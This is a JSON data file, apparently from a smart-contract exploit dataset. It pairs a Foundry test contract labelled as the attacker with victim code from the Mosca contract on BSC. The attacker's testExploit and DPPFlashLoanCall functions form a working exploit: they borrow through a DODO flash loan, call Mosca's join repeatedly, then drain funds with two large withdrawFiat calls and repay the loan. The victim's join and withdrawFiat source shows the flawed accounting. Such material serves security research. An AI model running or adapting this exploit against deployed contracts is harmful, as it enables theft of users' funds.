[
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        IERC20(BUSD).approve(Mosca, type(uint).max);\n        IERC20(USDC).approve(Mosca, type(uint).max);\n        for(uint256 i=0;i<7;i++) {\n            uint256 amount = 1_000_000_000_000_000_000_000;\n            uint256 _refCode = 0;\n            uint8 fiat = 1;\n            bool enterpriseJoin = false;\n            IMosca(Mosca).join(amount, _refCode, fiat, enterpriseJoin);\n        }\n\n        IMosca(Mosca).withdrawFiat(18_671_180_855_284_200_248_407, false, 1);\n        IMosca(Mosca).withdrawFiat(26_648_013_000_000_000_000_000, false, 0);\n\n        IERC20(BUSD).transfer(DPP, quoteAmount);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(USDC);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Mosca2",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        uint256 baseAmount = 0;\n        uint256 quoteAmonut = 7_000_000_000_000_000_000_000;\n        address assetTo = address(this);\n        bytes memory data = abi.encode(\"0xdead\");\n        IDODO(DPP).flashLoan(baseAmount, quoteAmonut, assetTo, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDODO",
    "source_type": "victim_contract",
    "function_name": "_BASE_TOKEN_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDODO",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMosca",
    "source_type": "victim_contract",
    "function_name": "join",
    "original_code": "     function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant{\n           User storage user = users[msg.sender];\n           uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;\n            uint256 tax_remainder;\n\n           uint256 baseAmount = ((amount + diff) * 1000) / 1015;\n          \n       \n\n      \n            if(enterpriseJoin) {\n                \n                if(refByAddr[msg.sender] == 0) {\n                    require(amount >= (ENTERPRISE_JOIN_FEE * 3) + (JOIN_FEE * 3), \"Insufficient amount sent to join enterprise\");\n                    if(fiat == 1){\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    \n                    \n                    } else {\n                        require(usdc.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                        require(usdc.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    }\n\n                    emit AdminFeesSent(owner, block.timestamp, ENTERPRISE_TAX * 3, fiat);\n\n                } else {\n                    \n                    require(amount + diff >= (ENTERPRISE_JOIN_FEE * 3), \"Insufficient amount to upgrade to enterprise\");\n                    if(diff < ENTERPRISE_TAX * 3){\n                        tax_remainder = (ENTERPRISE_TAX * 3) - diff;\n                        adminBalance+= (ENTERPRISE_TAX * 3) - diff;\n                        user.balance -= diff;\n                        diff = 0;\n                        \n\n                         if(fiat == 1){\n                            require(usdt.transferFrom(msg.sender, feeReceiver, tax_remainder), \"Transfer failed\");\n                        } else {\n                            require(usdc.transferFrom(msg.sender, feeReceiver, tax_remainder), \"Transfer failed\");\n                        }\n\n                        emit AdminFeesSent(owner, block.timestamp, tax_remainder, fiat);\n\n                    } else {\n                        adminBalance+= ENTERPRISE_TAX * 3;\n                        diff -= ENTERPRISE_TAX * 3;\n                         user.balance -= ENTERPRISE_TAX * 3; \n                        if(diff > ENTERPRISE_JOIN_FEE * 3){\n                            user.balance -= (ENTERPRISE_JOIN_FEE * 3);\n                        } else {\n                            user.balance -= diff;\n                        }\n                       \n\n                    }\n\n                      if(amount > 0) {\n\n                        if(fiat == 1){\n\n                            require(usdt.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        } else {\n\n                            require(usdc.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        }\n\n\n                        }\n                    \n                    \n\n                  \n\n                }\n                user.enterprise = true;\n            } else {\n\n                require(amount >= JOIN_FEE, \"Insufficient amount sent\");\n\n\n                if(fiat == 1){\n\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, feeReceiver, TAX * 3), \"Transfer failed\");\n                } else {\n\n                     require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdc.transferFrom(msg.sender, feeReceiver, TAX * 3), \"Transfer failed\");\n\n                }\n\n                emit AdminFeesSent(owner, block.timestamp, TAX * 3, fiat);\n\n                \n\n\n            }\n        \n        \n      \n       user.nextDeadline = block.timestamp + 28 days;\n       user.bonusDeadline = block.timestamp + 7 days;\n       user.walletAddress = msg.sender;\n        totalRevenue+= amount;\n        user.balance += enterpriseJoin ? baseAmount - ENTERPRISE_JOIN_FEE : baseAmount - JOIN_FEE;\n\n     \n\n        if(referrers[_refCode] != address(0)){\n            user.collectiveCode = _refCode;\n            users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n            users[referrers[user.collectiveCode]].inviteCount++;\n            emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            if(users[referrers[user.collectiveCode]].inviteCount % 3 == 0){\n                users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n                emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            }\n\n        }\n\n        rewardQueue.push(msg.sender);\n\n        if(refByAddr[msg.sender] == 0){\n        generateRefCode(msg.sender);\n        }\n\n        emit Joined(msg.sender, block.timestamp, amount, fiat);\n\n       cascade(msg.sender);\n\n        distributeFees(msg.sender, amount);\n        \n     }\n",
    "description": ""
  },
  {
    "contract/interface": "IMosca",
    "source_type": "victim_contract",
    "function_name": "withdrawFiat",
    "original_code": "    function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external nonReentrant {\n        require(!isBlacklisted[msg.sender], \"Blacklisted user\");\n         User storage user = users[msg.sender];\n         uint limit = user.enterprise ? 127 * 10 ** 18 : 28 * 10 ** 18;\n         uint balance; \n          uint256 baseAmount = (amount * 1000) / 1015;\n         if(!isFiat) {\n             balance = user.balance; \n\n         } else {\n              balance = fiatToWithdraw == 1 ? user.balanceUSDT  : user.balanceUSDC ;\n         }\n\n          require(amount <= balance - limit, \"Insufficient balance\");\n\n          if (!isFiat){\n            user.balance -= amount;\n          }\n          else {\n           fiatToWithdraw == 1 ? user.balanceUSDT -= amount  : user.balanceUSDC -= amount ;\n          }\n           \n       \n        \n\n        fiatToWithdraw == 1 ? usdt.transfer(msg.sender, baseAmount) : usdc.transfer(msg.sender, baseAmount);\n\n        if(!isFiat) {\n            \n            distributeFees(msg.sender, amount);\n             \n         } else {\n              distributeFeesFiat(msg.sender, amount, fiatToWithdraw);\n         }\n        \n\n        emit WithdrawFiat(msg.sender, block.timestamp, amount, fiatToWithdraw);\n\n        \n\n    }\n    \n",
    "description": ""
  }
]